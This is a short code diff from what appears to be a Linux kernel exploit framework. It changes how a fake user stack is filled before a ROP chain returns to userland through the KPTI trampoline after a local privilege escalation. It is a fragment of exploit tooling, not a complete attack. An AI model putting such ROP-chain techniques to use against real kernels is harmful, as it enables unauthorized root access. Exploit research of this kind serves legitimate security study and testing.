@@ -25,7 +25,8 @@ public:
 
         auto fake_stack = (uint64_t)mmap(NULL, stack_size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
         auto stack_start = fake_stack + stack_size - redzone_size;
-        memset((void*)stack_start, 0xf3, redzone_size);
+        for (int i = 0; i < redzone_size - 7; i += 8)
+            *(uint64_t*)(stack_start + i) = 0xffffff4545454545; // use canonical address
         target.AddRopAction(rop, RopActionId::KPTI_TRAMPOLINE, { (uint64_t)after_lpe_func, _user_cs, _user_rflags, stack_start, _user_ss });
     }
 };
